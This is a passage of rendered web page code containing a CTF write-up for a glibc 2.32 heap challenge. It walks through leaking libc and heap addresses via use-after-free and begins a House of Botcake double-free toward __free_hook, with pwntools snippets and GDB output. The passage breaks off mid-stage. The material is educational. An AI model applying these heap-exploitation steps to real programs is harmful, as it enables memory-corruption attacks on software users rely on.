address\"]}),`\n`,(0,n.jsx)(e.p,{children:\"First, we will create a large chunk and then free it to make it go to unsorted bin:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`add(0, 0x1000, '{}'.format(0).encode()*8)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`add(1, 0x10, '{}'.format(1).encode()*8)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`free(0)\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Check in GDB and we can see that the main arena address contains null byte at LSB:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsortedbin_null_byte.png\",alt:\"unsortedbin_null_byte.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And we know that \",(0,n.jsx)(e.code,{children:\"puts()\"}),\" will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it\\u2019s different:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"And check again, we see that there is no null byte in the address anymore:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/large_bin_not_null_byte.png\",alt:\"large_bin_not_null_byte.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And below the libc main arena address is the heap forward and backward pointer but we won\\u2019t use this chunk to leak that heap address. Just libc is enough.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"So we just leak the libc address out with the bug \",(0,n.jsx)(e.strong,{children:\"Use After Free\"}),\", then calculate the offset and take the leaked address subtract with offset, we will get the libc base address:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x1b882a0-0x10\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b88290:  0x0000000000000000  0x0000000000001011\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882a0:  0x00007f4a4b3d9220  0x00007f4a4b3d9220\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882b0:  0x0000000001b88290  0x0000000001b88290\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882c0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1b882d0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  vmmap\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`[ Legend:  Code | Heap | Stack ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Start              End                Offset             Perm Path\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000001b88000 0x0000000001ba9000 0x0000000000000000 rw- [heap]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b212000 0x00007f4a4b214000 0x0000000000000000 rw-\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b214000 0x00007f4a4b23a000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f4a4b23a000 0x00007f4a4b388000 0x0000000000026000 r-x /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  p/x 0x00007f4a4b3d9220 - 0x00007f4a4b214000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`$1 = 0x1c5220\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So offset is \",(0,n.jsx)(e.code,{children:\"0x1c5220\"}),\". The following code will be use to take this leak and calculate libc base address:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1c5220\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"That\\u2019s great! Let\\u2019s move on the next stage: Leak heap address!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-2-leak-heap-address\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-leak-heap-address\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 2: Leak heap address\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just \",(0,n.jsx)(e.code,{children:\"free()\"}),\" 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`fw_pointer = u64(show(0).ljust(8, b'\\\\x00'))\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`log.success(\"Leak fw pointer: \" + hex(fw_pointer))\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And we can see that the forward pointer was leaked:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/fw_pointer_leaked.png\",alt:\"fw_pointer_leaked.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Check with GDB:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/check_fw_pointer.png\",alt:\"check_fw_pointer.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So as I mentioned above, with the first chunk is freed and goes to tcache, the forward pointer will be like this:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (       0x1a1c2a0        >> 12) ^             0            = 0x1a1c\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So to recover the heap base address, we just simply do the reverse order (don\\u2019t need to XOR) with the following payload:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And we get the heap base address. Before we move on next stage, just \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" again to reset the state of tcache bin to null:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"And now, let\\u2019s move on!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-3-overwrite-forward-pointer\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-overwrite-forward-pointer\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 3: Overwrite forward pointer\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"For this stage, we will use the technique called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c\",children:\"House of Botcake\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We will first \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Next, we will create 2 chunks with the same size as 0x100, the first one will be used for controlling (overwrite forward pointer) and the second one for attacking tcache:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And 1 small chunk to avoid consolidation:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Next, we will free all 7 chunks at the beginning of this stage to fill up the tcache:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And with the next free() the chunk with the same size as 0x100, because tcache is full so it will not be added to tcache but will put it to fastbin (if within size range of fastbin) or unsorted bin (in this case is unsorted bin because 0x100 is larger than fastbin)\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsorted_bin_after_7_free.png\",alt:\"unsorted_bin_after_7_free.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So as the technique describe, we still have 2 chunk (index 7 and 8) haven\\u2019t freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"After that, we will malloc 1 chunk with the same size of 0x100 to take 1 address out from tcache, and we free that chunk index 8 to put it to tcache and we successfully conducted a double free:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'testtest'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"I malloc with index 20 to not remove the pointer of index 8. After this, let\\u2019s check GDB. We can see that tcache is full of 7 chunk:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/tcache.png\",alt:\"tcache.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And unsorted bin contain a freed chunk:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsorted_bin.png\",alt:\"unsorted_bin.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Check the unsorted bin and we can see this:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x1604a20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a20:  0x0000000000000000  0x0000000000000221\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a30:  0x0000000001604c60  0x00007f2a65850c00    <-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a40:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a50:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a60:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a70:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a80:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a90:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604aa0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ab0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ac0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ad0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ae0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604af0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b00:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b10:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b20:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b30:  0x0000000000000000  0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b40:  0x0000000001605e14  0x0000000001604010    <-- Tcache\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b50:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b60:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b70:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b80:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b90:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ba0:  0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The unsorted bin size is 0x210 so that we can malloc a chunk larger than 0x100 to change the forward pointer in tcache chunk. But first, we need to take the offset between heap base address and that tcache chunk address \",(0,n.jsx)(e.code,{children:\"0x1604b40\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  vmmap\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`[ Legend:  Code | Heap | Stack ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Start              End                Offset             Perm Path\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000001604000 0x0000000001625000 0x0000000000000000 rw- [heap]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f2a6568a000 0x00007f2a6568c000 0x0000000000000000 rw-\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f2a6568c000 0x00007f2a656b2000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  p/x  0x1604b40- 0x0000000001604000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`$1 = 0xb40\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So we know the offset. Remember the new mechanism for the forward pointer and we can fake the forward pointer to malloc \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with the payload below:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py 